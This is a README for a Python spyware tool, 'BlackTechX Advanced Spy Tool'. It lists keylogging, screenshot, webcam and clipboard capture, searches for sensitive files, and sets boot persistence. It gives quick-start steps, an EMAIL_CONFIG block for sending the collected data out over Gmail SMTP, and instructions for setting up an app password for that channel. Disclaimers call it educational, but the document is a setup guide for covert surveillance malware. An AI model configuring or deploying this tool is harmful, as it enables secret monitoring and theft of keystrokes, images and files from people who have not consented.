
# BlackTechX Advanced Spy Tool                                         

 [![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://python.org)                                                        
 [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-orange.svg)](https://github.com/yourusername/BlackTechX-Spy-Tool)                                                         
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)                                                   
 [![Status](https://img.shields.io/badge/Status-Development%20Ready-red.svg)](https://github.com/yourusername/BlackTechX-Spy-Tool)           

#⚠️⚠️⚠️ IMPORTANT DISCLAIMER – READ CAREFULLY ⚠️⚠️⚠️

🚨 THIS PROJECT IS STRICTLY FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY 🚨

This tool is created ONLY to:

Learn how surveillance and malware techniques work

Perform AUTHORIZED penetration testing

Study cybersecurity threats to build better defenses

❌ ANY UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL
❌ DO NOT use this tool on devices you do not own or do not have explicit permission for

⚖️ The author is NOT responsible for:

Misuse of this software

Privacy violations

Legal consequences caused by improper usage

👉 By using this project, you accept full responsibility for your actions.

📸 FEATURES
🔹 Core Surveillance

Keylogging – Capture real‑time keystrokes

Screenshots – Automatic screen capture at set intervals

Webcam Capture – Periodic webcam snapshots (if available)

Clipboard Monitoring – Tracks copied text

🔹 Advanced Intelligence

System Information – Hardware & software details

Network Intelligence – IP addresses and network interfaces

File Discovery – Search for sensitive files (.txt, .doc, .pdf, etc.)

Process Monitoring – Lists running processes

🔹 Automated Reporting

Email Auto‑Sender – Sends compressed data packages

Cross‑Platform – Linux, Windows, macOS

Persistence – Auto‑start on system boot

UTM Optimized – Special support for Linux in UTM

🚀 QUICK START
1️⃣ Clone the Repository
git clone https://github.com/yourusername/BlackTechX-Spy-Tool.git
cd BlackTechX-Spy-Tool

2️⃣ Install Dependencies
pip install -r requirements.txt

3️⃣ Configure Email Reporting

Edit spy_tool.py:

EMAIL_CONFIG = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'sender_email': 'your_email@gmail.com',
    'sender_password': 'your_app_password',  # Gmail App Password
    'recipient_email': 'recipient_email@gmail.com',
    'email_interval': 300
}

4️⃣ Run the Tool
python spy_tool.py

🔐 GMAIL APP PASSWORD SETUP (REQUIRED)

Gmail DOES NOT allow normal passwords for scripts.

Steps:

1️⃣ Go to 👉 https://myaccount.google.com

2️⃣ Open Security
3️⃣ Enable 2‑Step Verification
4️⃣ Go to Security → App passwords
5️⃣ Generate password for Mail
6️⃣ Copy the 16‑character password and use it in the script

⚠️ Never upload real credentials to GitHub.

⚙️ CONFIGURATION OPTIONS
ADVANCED_CONFIG = {
    'screenshot_interval': 60,
    'webcam_interval': 300,
    'clipboard_monitor': True,
    'email_interval': 300
}

📁 File Search
file_extensions = ['.txt', '.doc', '.pdf', '.xls', '.csv', '.py', '.js']

# Linux / macOS
search_directories = ['/home', '/Users']

# Windows
search_directories = ['C:\\', 'D:\\']

🔧 SYSTEM REQUIREMENTS

Python 3.8+

Linux / Windows / macOS

Administrator / root access recommended

Linux Dependencies
sudo apt-get install gnome-screenshot scrot imagemagick python3-opencv

⚖️ LEGAL & ETHICAL USAGE
✅ Allowed

Educational learning

Security research

Penetration testing with permission

❌ NOT Allowed

Unauthorized surveillance

Spying on users

Data theft or privacy invasion

📜 FINAL DISCLAIMER

This software is provided “AS IS”, without any warranty.
The author takes NO responsibility for misuse, damage, or legal issues.

Use responsibly. Think ethically. Learn defensively.

👤 AUTHOR & CONTACT

Made with ❤️ by Ibrahim Shaik
🎓 Cybersecurity Student
🔐 Ethical Hacking & Security Research
